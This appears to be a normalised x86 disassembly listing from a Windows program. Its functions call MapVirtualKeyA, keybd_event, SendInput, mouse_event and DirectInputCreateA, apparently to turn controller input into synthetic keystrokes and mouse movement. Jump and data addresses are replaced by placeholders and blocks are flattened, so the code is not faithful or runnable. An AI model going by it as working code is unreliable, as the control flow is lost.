lea ebx [ esi + 0xc ]
xor edx edx
mov [ ebx + 0x34 ] edx
jmp r-xdata
test eax eax
jne r-xdata
inc edi
add ebx 0x4
cmp edi 0x3
jl r-xdata
mov ecx [ ebx ]
cmp ecx 0xa1
jg r-xdata
mov eax [ ebx ]
cmp eax 0xff
ja r-xdata
mov ecx [ esi + 0x8 ]
test ecx ecx
jle r-xdata
sub ecx 0xa2
je r-xdata
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
jge r-xdata
mov eax 0x7d00
cdq
idiv ecx
mov [ esi + 0x4c ] eax
xor ecx ecx
mov [ esi + 0x50 ] ecx
jmp r-xdata
mov [ ebx + 0x34 ] 0x1d
jmp r-xdata
dec ecx
je r-xdata
mov [ ebx + 0x34 ] 0x36
jmp r-xdata
cmp ecx 0x27
jg r-xdata
mov eax [ esi + 0x38 ]
test eax eax
jge r-xdata
neg eax
mov edx eax
shl edx 0x8
xor ecx ecx
lea edx [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
mov [ esi + 0x4c ] edx
mov [ esi + 0x50 ] ecx
mov [ ebx + 0x34 ] 0x9d
jmp r-xdata
dec ecx
je r-xdata
sub ecx 0x28
je r-xdata
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
xor ecx ecx
mov [ esi ] edx
mov [ esi + 0x38 ] ecx
mov [ ebx + 0x34 ] 0x38
jmp r-xdata
dec ecx
je r-xdata
mov [ ebx + 0x34 ] 0xd0
jmp r-xdata
sub ecx 0x78
je r-xdata
mov [ ebx + 0x34 ] 0xcd
jmp r-xdata
sub ecx 0x25
je r-xdata
mov [ ebx + 0x34 ] 0xb8
jmp r-xdata
jmp r-xdata
mov [ ebx + 0x34 ] 0x2a
jmp r-xdata
jmp r-xdata
mov [ ebx + 0x34 ] 0xcb
jmp r-xdata
dec ecx
je r-xdata
push 0x0
mov al [ ebx ]
and al 0xff
xor edx edx
mov dl al
push edx
call MapVirtualKeyA
mov [ ebx + 0x34 ] eax
mov [ ebx + 0x34 ] 0xc8
jmp r-xdata
jmp r-xdata
sub_40d928
push ebp
mov ebp esp
add esp 0xfffffbd4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov ebx eax
mov eax rw-data
call sub_4c517c
mov edx [ ebx ]
dec edx
je r-xdata
mov ecx [ ebx + 0x4 ]
push ecx
mov eax [ ebx + 0x8 ]
push eax
mov edx [ ebx + 0x14 ]
push edx
lea edx [ ebp - 0x42c ]
mov ecx [ ebx + 0x10 ]
push ecx
mov eax [ ebx + 0xc ]
push eax
push rw-data
push edx
call sub_4c8520
add esp 0x1c
jmp r-xdata
dec edx
je r-xdata
mov [ ebp - 0x1c ] 0xc
lea edx [ ebp - 0x42c ]
lea eax [ ebp - 0x4 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x10 ]
lea ebx [ ebp - 0x4 ]
inc [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4d2758
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] 0x18
push eax
dec [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
pop eax
mov [ ebp - 0x1c ] 0xc
add [ ebp - 0x10 ] 0x2
mov edx [ ebp - 0x2c ]
mov [ fs : 0x0 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
add esp 0xfffffff8
fld [ ebx + 0x34 ]
fstp [ esp ]
mov ecx [ ebx + 0x30 ]
push ecx
mov eax [ ebx + 0x4 ]
push eax
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x2c ]
push ecx
mov eax [ ebx + 0x28 ]
push eax
mov edx [ ebx + 0x24 ]
push edx
mov ecx [ ebx + 0x20 ]
push ecx
lea ecx [ ebp - 0x42c ]
mov eax [ ebx + 0x1c ]
push eax
mov edx [ ebx + 0x18 ]
push edx
push rw-data
push ecx
call sub_4c8520
add esp 0x34
jmp r-xdata
dec edx
sub edx 0x3
jb r-xdata
mov eax [ ebx + 0x38 ]
lea ecx [ ebp - 0x42c ]
push eax
mov edx [ ebx ]
push edx
push rw-data
push ecx
call sub_4c8520
add esp 0x10
jmp r-xdata
je r-xdata
lea esi [ ebx + 0x3c ]
mov eax [ esi ]
test eax eax
jne r-xdata
jmp r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov edx rw-data
jmp r-xdata
push rw-data
lea eax [ ebp - 0x42c ]
push eax
call sub_4c8520
add esp 0x8
mov edx [ esi ]
movzx eax [ edi - 0xa ]
cmp eax 0x2
jne r-xdata
push edx
push rw-data
lea ecx [ ebp - 0x42c ]
push ecx
call sub_4c8520
add esp 0xc
jmp r-xdata
mov eax esi
call j_sub_44a5d8#2
mov edx esi
mov eax esi
call sub_41e5d8
sub_40daa4
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x10 ] 0x2
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_4d2618
inc [ ebp - 0x10 ]
inc [ ebp - 0x10 ]
mov [ ebp - 0x1c ] 0xc
mov eax ebx
call sub_40d6f0
mov edx [ ebp - 0x4 ]
test edx edx
jne r-xdata
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
mov esi rw-data
jmp r-xdata
mov esi [ ebp - 0x4 ]
movzx eax [ edi - 0xa ]
cmp eax 0x2
jne r-xdata
push esi
call sub_4ccb50
pop ecx
mov [ ebx ] eax
mov eax [ ebx ]
dec eax
je r-xdata
lea edx [ ebx + 0x4 ]
push edx
lea ecx [ ebx + 0x8 ]
push ecx
lea eax [ ebx + 0x14 ]
push eax
lea edx [ ebx + 0x10 ]
push edx
lea ecx [ ebx + 0xc ]
push ecx
push ebx
push rw-data
mov eax [ ebp - 0x4 ]
test eax eax
jne r-xdata
dec eax
je r-xdata
lea eax [ ebp - 0x4 ]
call j_sub_44a5d8#2
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_41e5d8
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
mov edx rw-data
jmp r-xdata
xor ecx ecx
mov [ ebx + 0x8 ] ecx
lea eax [ ebx + 0x34 ]
push eax
lea edx [ ebx + 0x30 ]
push edx
lea ecx [ ebx + 0x4 ]
push ecx
lea eax [ ebx + 0x8 ]
push eax
lea edx [ ebx + 0x2c ]
push edx
lea ecx [ ebx + 0x28 ]
push ecx
lea eax [ ebx + 0x24 ]
push eax
lea edx [ ebx + 0x20 ]
push edx
lea ecx [ ebx + 0x1c ]
push ecx
lea eax [ ebx + 0x18 ]
push eax
push ebx
push rw-data
mov edx [ ebp - 0x4 ]
test edx edx
jne r-xdata
dec eax
sub eax 0x3
jb r-xdata
mov edx [ ebp - 0x4 ]
movzx eax [ esi - 0xa ]
cmp eax 0x2
jne r-xdata
push edx
call sub_4c859c
add esp 0x20
jmp r-xdata
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
mov ecx rw-data
jmp r-xdata
lea edx [ ebx + 0x38 ]
push edx
push ebx
push rw-data
mov eax [ ebp - 0x4 ]
test eax eax
jne r-xdata
je r-xdata
mov eax ebx
call sub_40d804
dec [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
mov ecx [ ebp - 0x2c ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x4 ]
call j_sub_44a5d8#2
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_41e5d8
mov ecx [ ebp - 0x4 ]
movzx eax [ esi - 0xa ]
cmp eax 0x2
jne r-xdata
push ecx
call sub_4c859c
add esp 0x34
jmp r-xdata
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
mov edx rw-data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
test ecx ecx
jne r-xdata
jmp r-xdata
lea eax [ ebp - 0x4 ]
call j_sub_44a5d8#2
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_41e5d8
mov edx [ ebp - 0x4 ]
movzx eax [ esi - 0xa ]
cmp eax 0x2
jne r-xdata
push edx
call sub_4c859c
add esp 0x10
jmp r-xdata
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
mov eax rw-data
jmp r-xdata
lea eax [ ebp - 0x4 ]
call j_sub_44a5d8#2
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_41e5d8
mov eax [ ebp - 0x4 ]
movzx eax [ esi - 0xa ]
cmp eax 0x2
jne r-xdata
mov esi eax
push 0x4
push rw-data
push esi
call sub_4c4f48
add esp 0xc
test eax eax
jne r-xdata
add esi 0x4
lea edi [ ebx + 0x3c ]
mov [ ebp - 0x1c ] 0x18
mov [ ebp - 0x30 ] esi
push esi
call sub_4c4e7c
pop ecx
dec eax
mov [ ebp - 0x34 ] eax
push 0x0
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x30 ]
call sub_4d26c0
inc [ ebp - 0x10 ]
lea eax [ ebp - 0x8 ]
inc [ ebp - 0x10 ]
mov edx eax
mov eax edi
call sub_4d2758
dec [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
lea eax [ ebp - 0x8 ]
xor edx edx
call sub_4d2728
lea eax [ ebp - 0x4 ]
call j_sub_44a5d8#2
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_41e5d8
sub_40dd18
push ebx
mov ebx eax
mov al [ ebx + 0x54 ]
test al al
je r-xdata
mov [ ebx + 0x55 ] 0x0
pop ebx
retn
push 0x1
xor ecx ecx
xor edx edx
mov eax ebx
call sub_40de80
sub_40dd38
push ebx
push esi
mov esi eax
push edi
mov eax [ rw-data ]
mov edi edx
cmp edi eax
push ecx
setg bl
and ebx 0x1
mov al [ esi + 0x55 ]
test al al
jne r-xdata
xor edx edx
jmp r-xdata
test bl bl
jne r-xdata
mov [ esp ] dl
mov cl [ esi + 0x55 ]
test cl cl
je r-xdata
mov edx 0x1
xor eax eax
jmp r-xdata
test bl bl
je r-xdata
mov [ esp + 0x1 ] al
mov [ esi + 0x55 ] bl
mov edx [ esi + 0x4 ]
dec edx
jne r-xdata
mov eax 0x1
mov ecx [ esi + 0x8 ]
test ecx ecx
je r-xdata
mov cl [ esp ]
test cl cl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov bl [ esi + 0x56 ]
xor eax eax
mov [ esp + 0x1 ] al
mov [ esp ] al
xor eax eax
mov al [ esi + 0x56 ]
cmp eax 0x1
sbb eax eax
xor edx edx
neg eax
mov [ esi + 0x56 ] al
mov [ esp ] al
mov dl al
mov ebx eax
mov eax edx
cmp eax 0x1
sbb ecx ecx
neg ecx
mov [ esp + 0x1 ] cl
push esi
push edx
push rw-data
push rw-data
call sub_41c394
add esp 0x10
jmp r-xdata
xor edi edi
test edi edi
jne r-xdata
xor ecx ecx
mov [ esi + 0x50 ] ecx
mov al [ esp + 0x1 ]
test al al
je r-xdata
sub [ esi + 0x50 ] 0x400
mov eax [ esi + 0x50 ]
test eax eax
jg r-xdata
mov [ esi + 0x55 ] 0x0
mov [ esi + 0x56 ] 0x0
xor ebx ebx
xor eax eax
mov [ esp + 0x1 ] al
mov [ esp ] al
mov dl [ esi + 0x54 ]
test dl dl
je r-xdata
mov dl [ rw-data ]
test dl dl
je r-xdata
mov al [ esp + 0x1 ]
mov edx edi
push eax
mov eax esi
mov cl [ esp + 0x4 ]
call sub_40de80
mov edi 0x3e8
jmp r-xdata
mov dl [ esi + 0x54 ]
test dl dl
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4c ]
add [ esi + 0x50 ] edx
xor ecx ecx
mov cl [ esi + 0x54 ]
cmp ecx 0x1
sbb eax eax
neg eax
mov [ esp ] al
mov ebx eax
xor eax eax
mov al [ esp ]
cmp eax 0x1
sbb edx edx
neg edx
mov [ esp + 0x1 ] dl
jmp r-xdata
mov [ esp + 0x1 ] 0x1
mov [ esp + 0x1 ] 0x0
sub_40de80
push ebp
mov ebp esp
push ebx
cmp edx [ rw-data ]
setg bl
and ebx 0x1
mov [ eax + 0x54 ] bl
mov ebx [ eax ]
dec ebx
je r-xdata
mov edx [ eax + 0xc ]
test dh 0xff
je r-xdata
dec ebx
je r-xdata
mov edx ecx
mov cl [ ebp + 0x8 ]
call sub_40df00
jmp r-xdata
shr edx 0x8
dec edx
je r-xdata
mov bl [ ebp + 0x8 ]
push ebx
call sub_40dfdc
jmp r-xdata
sub ebx 0x4
je r-xdata
pop ebx
pop ebp
retn 0x4
mov al [ ebp + 0x8 ]
test al al
je r-xdata
jmp r-xdata
mov dl [ ebp + 0x8 ]
test dl dl
je r-xdata
jmp r-xdata
xor eax eax
mov edx 0xf4
xor ecx ecx
push 0x0
push ecx
and al 0xff
push eax
and dl 0xff
push edx
call keybd_event
jmp r-xdata
mov [ rw-data ] eax
jmp r-xdata
sub_40df00
push ebx
push esi
push edi
add esp 0xffffffe4
test dl dl
jne r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x8 ]
mov ebx [ edx + 0x1a918 ]
sub ebx 0x1
jb r-xdata
test cl cl
je r-xdata
xor edi edi
test cl cl
je r-xdata
sub ebx 0x2
jb r-xdata
add esp 0x1c
pop edi
pop esi
pop ebx
retn
xor esi esi
lea ebx [ eax + 0xc ]
or edi 0x2
mov [ esp ] 0x1
xor ebx ebx
mov [ esp + 0x8 ] ebx
test cl cl
je r-xdata
jmp r-xdata
inc esi
add ebx 0x4
cmp esi 0x3
jl r-xdata
push 0x0
push edi
mov dl [ ebx + 0x34 ]
and dl 0xff
push edx
mov cl [ ebx ]
and cl 0xff
push ecx
call keybd_event
mov edx [ edx + 0x1a918 ]
cmp edx 0x2
jne r-xdata
or [ esp + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
jmp r-xdata
xor ecx ecx
xor edx edx
mov [ esp + 0xc ] ecx
mov [ esp + 0x10 ] edx
xor esi esi
lea ebx [ eax + 0xc ]
or [ esp + 0x8 ] 0x8
inc esi
add ebx 0x4
cmp esi 0x3
jl r-xdata
mov dl [ ebx ]
and dl 0xff
xor ecx ecx
mov cl dl
mov [ esp + 0x4 ] cx
mov al [ ebx + 0x34 ]
and al 0xff
xor edx edx
mov dl al
mov [ esp + 0x6 ] dx
push 0x1c
lea ecx [ esp + 0x4 ]
push ecx
push 0x1
call SendInput
mov eax [ ebx ]
test eax eax
je r-xdata
sub_40dfdc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
push esi
mov eax [ rw-data ]
mov esi edx
push edi
cmp esi eax
mov [ ebp - 0x1 ] cl
setg al
and eax 0x1
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x5c ] eax
mov [ ebx + 0x58 ] eax
mov [ ebx + 0x60 ] eax
mov eax [ ebx + 0x20 ]
test eax eax
je r-xdata
xor eax eax
mov cl [ ebp - 0x1 ]
test cl cl
je r-xdata
mov ecx [ ebx + 0x28 ]
test ecx ecx
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
test eax eax
jle r-xdata
mov dl [ ebp + 0x8 ]
test dl dl
je r-xdata
test edx edx
je r-xdata
mov eax [ ebx + 0x2c ]
test eax eax
je r-xdata
mov dl [ rw-data ]
test dl dl
je r-xdata
mov ecx [ ebx + 0x1c ]
test ecx ecx
je r-xdata
mov edx [ ebx + 0x20 ]
neg edx
imul edx esi
add [ ebx + 0x60 ] edx
imul esi
add [ ebx + 0x60 ] eax
jmp r-xdata
test eax eax
je r-xdata
mov edx [ ebx + 0x24 ]
test edx edx
je r-xdata
xor edx edx
mov edx 0x2
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov ecx [ ebx + 0x18 ]
imul ecx esi
add [ ebx + 0x58 ] ecx
mov eax [ ebx + 0x1c ]
imul esi
add [ ebx + 0x5c ] eax
mov eax [ ebx + 0x5c ]
mov edi [ ebx + 0x58 ]
sar eax 0xc
mov [ ebp - 0x8 ] eax
and [ ebx + 0x58 ] 0xfff
and [ ebx + 0x5c ] 0xfff
sar edi 0xc
mov dl [ rw-data ]
test dl dl
je r-xdata
test eax eax
je r-xdata
mov edx [ ebx + 0x24 ]
test edx edx
jne r-xdata
and [ ebx + 0x60 ] 0xffff
push 0x0
mov eax [ ebx + 0x20 ]
test eax eax
jle r-xdata
mov ecx [ ebx + 0x60 ]
cmp ecx 0x10000
jle r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push eax
call mouse_event
xor ecx ecx
mov ecx 0x4
jmp r-xdata
xor ecx ecx
mov ecx 0x20
jmp r-xdata
mov ecx [ ebx + 0x28 ]
test ecx ecx
je r-xdata
push 0x0
push 0x0
mov ecx [ ebp - 0x8 ]
push ecx
push edi
push 0x1
call mouse_event
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x1c ]
test eax eax
je r-xdata
push esi
push eax
mov eax [ ebx + 0x58 ]
push eax
push rw-data
push rw-data
call sub_41c394
add esp 0x14
mov edx 0xffffff88
mov edx 0x78
jmp r-xdata
xor edx edx
mov edx 0x40
jmp r-xdata
mov edx [ ebx + 0x28 ]
test edx edx
je r-xdata
xor ecx ecx
mov ecx 0x8
jmp r-xdata
or edx ecx
mov ecx [ ebx + 0x2c ]
test ecx ecx
je r-xdata
mov eax [ ebx + 0x1c ]
test eax eax
je r-xdata
push edi
imul esi
push eax
push rw-data
push rw-data
call sub_41c394
add esp 0x10
push esi
push eax
mov edx [ ebx + 0x5c ]
push edx
push rw-data
push rw-data
call sub_41c394
add esp 0x14
push edx
push 0x0
push 0x0
push 0x800
call mouse_event
xor edx edx
mov edx 0x10
jmp r-xdata
or ecx edx
mov edx [ ebx + 0x2c ]
test edx edx
je r-xdata
or edx ecx
or eax edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
push edx
imul esi
push eax
push rw-data
push rw-data
call sub_41c394
add esp 0x10
or ecx edx
or eax ecx
sub_40e1ec
push ebp
mov ebp esp
add esp 0xffffffc0
mov eax rw-data
push ebx
call sub_4c517c
mov [ ebp - 0x30 ] 0xc
mov edx rw-data
lea eax [ ebp - 0x4 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x24 ]
lea edx [ ebp - 0x4 ]
inc [ ebp - 0x24 ]
mov eax [ edx ]
push eax
push rw-data
push 0x2a1
push rw-data
push rw-data
call sub_41c2dc
add esp 0x14
dec [ ebp - 0x24 ]
dec [ ebp - 0x24 ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
mov ecx [ rw-data ]
push 0x0
push rw-data
push 0x700
mov eax [ ecx ]
push eax
call DirectInputCreateA
test eax eax
jge r-xdata
call sub_40e8e8
mov [ ebp - 0x30 ] 0x30
mov edx rw-data
lea eax [ ebp - 0x18 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x24 ]
inc [ ebp - 0x24 ]
lea eax [ ebp - 0x18 ]
push eax
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx [ rw-data ]
inc [ ebp - 0x24 ]
push ebx
lea ecx [ ebp - 0x14 ]
push rw-data
push ecx
call sub_402d3c
add esp 0xc
lea eax [ ebp - 0x14 ]
inc [ ebp - 0x24 ]
xor edx edx
mov [ ebp - 0x1c ] edx
inc [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
inc [ ebp - 0x24 ]
pop edx
call sub_402e08
lea eax [ ebp - 0x1c ]
mov ecx [ eax ]
push ecx
push rw-data
push 0x2ad
push rw-data
push rw-data
call sub_41c26c
add esp 0x14
dec [ ebp - 0x24 ]
dec [ ebp - 0x24 ]
lea eax [ ebp - 0x1c ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x24 ]
dec [ ebp - 0x24 ]
lea eax [ ebp - 0x18 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x24 ]
dec [ ebp - 0x24 ]
lea eax [ ebp - 0x14 ]
xor edx edx
call sub_4d2728
mov al 0x1
mov edx [ ebp - 0x40 ]
mov [ fs : 0x0 ] edx
mov [ ebp - 0x30 ] 0x18
mov edx rw-data
lea eax [ ebp - 0x8 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0x24 ]
lea edx [ ebp - 0x8 ]
inc [ ebp - 0x24 ]
mov eax [ edx ]
push eax
push rw-data
push 0x2a7
push rw-data
push rw-data
call sub_41c1fc
add esp 0x14
dec [ ebp - 0x24 ]
dec [ ebp - 0x24 ]
lea eax [ ebp - 0x8 ]
xor edx edx
call sub_4d2728
mov [ ebp - 0x30 ] 0x24
xor ecx ecx
lea eax [ ebp - 0xc ]
mov [ ebp - 0xc ] ecx
push eax
inc [ ebp - 0x24 ]
call sub_41be7c
pop ecx
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x10 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x24 ]
lea edx [ ebp - 0x10 ]
inc [ ebp - 0x24 ]
mov eax [ edx ]
push eax
push rw-data
push 0x2a8
push rw-data
push rw-data
call sub_41c1fc
add esp 0x14
dec [ ebp - 0x24 ]
dec [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x24 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
xor eax eax
mov edx [ ebp - 0x40 ]
mov [ fs : 0x0 ] edx
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_40e3f8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x18 ] 0xc
mov edx rw-data
lea eax [ ebp - 0x4 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
inc [ ebp - 0xc ]
mov eax [ edx ]
push eax
push rw-data
push 0x2b4
push rw-data
push rw-data
call sub_41c2dc
add esp 0x14
dec [ ebp - 0xc ]
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor esi esi
mov ebx rw-data
jmp r-xdata
mov ecx [ rw-data ]
cmp esi ecx
jl r-xdata
mov eax [ ebx ]
push eax
mov edx [ eax ]
call [ edx + 0x20 ]
mov ecx [ ebx ]
push ecx
mov eax [ ecx ]
call [ eax + 0x8 ]
xor edx edx
mov [ ebx ] edx
inc esi
add ebx 0x4
mov eax [ rw-data ]
push eax
mov edx [ eax ]
call [ edx + 0x8 ]
xor ecx ecx
mov [ rw-data ] ecx
sub_40e4b0
push ebp
mov ebp esp
add esp 0xffffffa4
mov eax rw-data
call sub_4c517c
mov eax [ ebp + 0xc ]
lea edx [ ebp - 0x2c ]
push 0x0
push edx
mov ecx [ ebp + 0x8 ]
add ecx 0x4
push ecx
push eax
mov eax [ eax ]
call [ eax + 0xc ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x30 ]
push ecx
push rw-data
mov eax [ ebp - 0x2c ]
push eax
mov edx [ eax ]
call [ edx ]
test eax eax
jge r-xdata
mov [ ebp - 0x18 ] 0xc
mov edx rw-data
lea eax [ ebp - 0x4 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
inc [ ebp - 0xc ]
mov eax [ edx ]
push eax
push rw-data
push 0x2c9
push rw-data
push rw-data
call sub_41c1fc
add esp 0x14
dec [ ebp - 0xc ]
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4d2728
mov eax 0x1
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
jmp r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
mov eax [ ecx ]
call [ eax + 0x8 ]
push rw-data
mov edx [ ebp - 0x30 ]
push edx
mov ecx [ edx ]
call [ ecx + 0x2c ]
test eax eax
je r-xdata
mov eax [ rw-data ]
push 0x10
mov ecx rw-data
mov edx rw-data
mov eax [ eax ]
call sub_4826f8
mov edx [ ebp - 0x2c ]
push edx
mov ecx [ edx ]
call [ ecx + 0x8 ]
mov eax 0x1
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
jmp r-xdata
mov esp ebp
pop ebp
retn 0x8
push 0xa
mov ecx [ rw-data ]
mov eax [ ecx ]
call sub_496868
push eax
mov edx [ ebp - 0x30 ]
push edx
mov ecx [ edx ]
call [ ecx + 0x34 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
push 0x10
mov ecx rw-data
mov edx rw-data
mov eax [ eax ]
call sub_4826f8
mov edx [ ebp - 0x30 ]
push edx
mov ecx [ edx ]
call [ ecx + 0x8 ]
mov eax 0x1
mov edx [ ebp - 0x28 ]
mov [ fs : 0x0 ] edx
jmp r-xdata
push 0x18
push 0x0
lea ecx [ ebp - 0x48 ]
push ecx
call sub_4c4d44
mov [ ebp - 0x48 ] 0x18
mov [ ebp - 0x44 ] 0x10
mov [ ebp - 0x3c ] 0x1
mov [ ebp - 0x38 ] 0xfffffc18
mov [ ebp - 0x34 ] 0x3e8
add esp 0xc
xor eax eax
mov [ ebp - 0x40 ] eax
lea edx [ ebp - 0x48 ]
push edx
push 0x4
mov ecx [ ebp - 0x30 ]
push ecx
mov eax [ ecx ]
call [ eax + 0x18 ]
mov [ ebp - 0x40 ] 0x4
lea edx [ ebp - 0x48 ]
push edx
push 0x4
mov ecx [ ebp - 0x30 ]
push ecx
mov eax [ ecx ]
call [ eax + 0x18 ]
mov [ ebp - 0x40 ] 0x8
lea edx [ ebp - 0x48 ]
push edx
push 0x4
mov ecx [ ebp - 0x30 ]
push ecx
mov eax [ ecx ]
call [ eax + 0x18 ]
mov [ ebp - 0x40 ] 0xc
lea edx [ ebp - 0x48 ]
push edx
push 0x4
mov ecx [ ebp - 0x30 ]
push ecx
mov eax [ ecx ]
call [ eax + 0x18 ]
mov [ ebp - 0x40 ] 0x10
lea edx [ ebp - 0x48 ]
push edx
push 0x4
mov ecx [ ebp - 0x30 ]
push ecx
mov eax [ ecx ]
call [ eax + 0x18 ]
mov [ ebp - 0x40 ] 0x14
lea edx [ ebp - 0x48 ]
push edx
push 0x4
mov ecx [ ebp - 0x30 ]
push ecx
mov eax [ ecx ]
call [ eax + 0x18 ]
mov [ ebp - 0x40 ] 0x18
lea edx [ ebp - 0x48 ]
push edx
push 0x4
mov ecx [ ebp - 0x30 ]
push ecx
mov eax [ ecx ]
call [ eax + 0x18 ]
mov [ ebp - 0x40 ] 0x1c
lea edx [ ebp - 0x48 ]
push edx
push 0x4
mov ecx [ ebp - 0x30 ]
push ecx
mov eax [ ecx ]
call [ eax + 0x18 ]
push 0x14
push 0x0
lea edx [ ebp - 0x5c ]
push edx
call sub_4c4d44
mov [ ebp - 0x5c ] 0x14
mov [ ebp - 0x58 ] 0x10
mov ecx [ rw-data ]
add esp 0xc
mov [ ebp - 0x50 ] 0x1
mov eax [ ecx + 0x10 ]
xor edx edx
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x54 ] edx
lea ecx [ ebp - 0x5c ]
push ecx
push 0x5
mov eax [ ebp - 0x30 ]
push eax
mov edx [ eax ]
call [ edx + 0x18 ]
mov [ ebp - 0x54 ] 0x4
lea ecx [ ebp - 0x5c ]
push ecx
push 0x5
mov eax [ ebp - 0x30 ]
push eax
mov edx [ eax ]
call [ edx + 0x18 ]
mov [ ebp - 0x54 ] 0x8
lea ecx [ ebp - 0x5c ]
push ecx
push 0x5
mov eax [ ebp - 0x30 ]
push eax
mov edx [ eax ]
call [ edx + 0x18 ]
mov [ ebp - 0x54 ] 0xc
lea ecx [ ebp - 0x5c ]
push ecx
push 0x5
mov eax [ ebp - 0x30 ]
push eax
mov edx [ eax ]
call [ edx + 0x18 ]
mov [ ebp - 0x54 ] 0x10
lea ecx [ ebp - 0x5c ]
push ecx
push 0x5
mov eax [ ebp - 0x30 ]
push eax
mov edx [ eax ]
call [ edx + 0x18 ]
mov [ ebp - 0x54 ] 0x14
lea ecx [ ebp - 0x5c ]
push ecx
push 0x5
mov eax [ ebp - 0x30 ]
push eax
mov edx [ eax ]
call [ edx + 0x18 ]
mov [ ebp - 0x54 ] 0x18
lea ecx [ ebp - 0x5c ]
push ecx
push 0x5
mov eax [ ebp - 0x30 ]
push eax
mov edx [ eax ]
call [ edx + 0x18 ]
mov [ ebp - 0x54 ] 0x1c
lea ecx [ ebp - 0x5c ]
push ecx
push 0x5
mov eax [ ebp - 0x30 ]
push eax
mov edx [ eax ]
call [ edx + 0x18 ]
mov ecx [ rw-data ]
xor edx edx
mov eax [ ecx + 0x14 ]
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x54 ] edx
push ecx
push 0x6
mov eax [ ebp - 0x30 ]
push eax
mov edx [ eax ]
call [ edx + 0x18 ]
mov [ ebp - 0x54 ] 0x4
lea ecx [ ebp - 0x5c ]
push ecx
push 0x6
mov eax [ ebp - 0x30 ]
push eax
mov edx [ eax ]
call [ edx + 0x18 ]
mov [ ebp - 0x54 ] 0x8
lea ecx [ ebp - 0x5c ]
push ecx
push 0x6
mov eax [ ebp - 0x30 ]
push eax
mov edx [ eax ]
call [ edx + 0x18 ]
mov [ ebp - 0x54 ] 0xc
